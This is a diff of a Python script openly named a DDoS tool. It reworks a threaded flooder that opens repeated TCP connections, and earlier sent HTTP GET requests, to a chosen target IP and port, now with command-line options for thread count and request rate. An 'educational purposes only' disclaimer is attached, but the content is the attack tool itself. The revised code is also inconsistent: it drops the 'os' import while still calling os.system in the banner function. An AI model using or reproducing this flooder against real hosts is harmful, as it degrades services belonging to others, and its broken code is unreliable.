@@ -1,9 +1,8 @@
-import socket
-import threading
-import os
-import re
-
-#this code is fucked so to whoever wanna tinker with it just give up or good luck
+import  socket
+import  threading
+import  time
+import  argparse
+import  logging
 
 def display_banner():
     banner = r"""
@@ -19,70 +18,42 @@ def display_banner():
     os.system('clear' if os.name == 'posix' else 'cls')  # Clear the terminal screen
     print(banner)
 
-def validate_ip(ip):
-    """Validate the format of an IP address."""
-    pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
-    return pattern.match(ip) is not None and all(0 <= int(octet) <= 255 for octet in ip.split('.'))
 
-def ddos(target_ip, target_port, thread_id):
-    """
-    Simulates sending repeated requests to a target server.
-    Only for educational purposes in a controlled environment.
-    """
+# Set up logging
+logging.basicConfig(filename='ddos.log', level=logging.INFO, format='%(asctime)s - %(message)s')
+
+def attack(target_ip, target_port):
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(2)  # Set a timeout for the connection
-        sock.connect((target_ip, target_port))
-
-        request = f"GET / HTTP/1.0\r\nHost: {target_ip}\r\n\r\n"
-        sock.send(request.encode())
-        print(f"[Thread {thread_id}] Request sent to {target_ip}:{target_port}")
-
-        sock.close()
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((target_ip, target_port))
+        logging.info(f"Connected to {target_ip}:{target_port}")
+        s.close()
     except socket.error as e:
-        print(f"[Thread {thread_id}] Error: {e}")
+        logging.error(f"Error: {e}")
 
-def run_ddos(target, port, num_threads):
-    """
-    Launch multiple threads to simulate concurrent requests.
-    """
-    threads = []
-    for i in range(num_threads):
-        thread = threading.Thread(target=ddos, args=(target, port, i + 1))
-        threads.append(thread)
+def start_attack(target_ip, target_port, num_threads, rate_limit):
+    for _ in range(num_threads):
+        thread = threading.Thread(target=attack, args=(target_ip, target_port))
         thread.start()
-
-    for thread in threads:
-        thread.join()
+        time.sleep(1 / rate_limit)
 
 def main():
-    display_banner()
-    print("Welcome to the DDOS Educational Script")
-    print("This script is for educational purposes only and should be used responsibly.")
+    print("""
+    DISCLAIMER:
+    This script is for educational purposes only. 
+    Do not use it for illegal or malicious activities.
+    The author is not responsible for any misuse of this script.
+    """)
 
-    target = input("Enter the IP address of the target (e.g., 192.168.1.1): ")
-    if not validate_ip(target):
-        print("Invalid IP address format. Exiting.")
-        return
+    parser = argparse.ArgumentParser(description="DDOS Script for Educational Purposes")
+    parser.add_argument("target_ip", help="Target IP address")
+    parser.add_argument("target_port", type=int, help="Target port")
+    parser.add_argument("--threads", type=int, default=10, help="Number of threads")
+    parser.add_argument("--rate", type=int, default=5, help="Requests per second")
+    args = parser.parse_args()
 
-    try:
-        port = int(input("Enter the port number of the target (e.g., 80): "))
-        if not (1 <= port <= 65535):
-            raise ValueError("Port number must be between 1 and 65535.")
-    except ValueError as e:
-        print(f"Invalid port: {e}")
-        return
-
-    try:
-        num_threads = int(input("Enter the number of threads: "))
-        if num_threads < 1:
-            raise ValueError("Number of threads must be at least 1.")
-    except ValueError as e:
-        print(f"Invalid input: {e}")
-        return
-
-    print(f"Starting DDoS simulation with {num_threads} threads on {target}:{port}...")
-    run_ddos(target, port, num_threads)
+    start_attack(args.target_ip, args.target_port, args.threads, args.rate)
 
 if __name__ == "__main__":
     main()
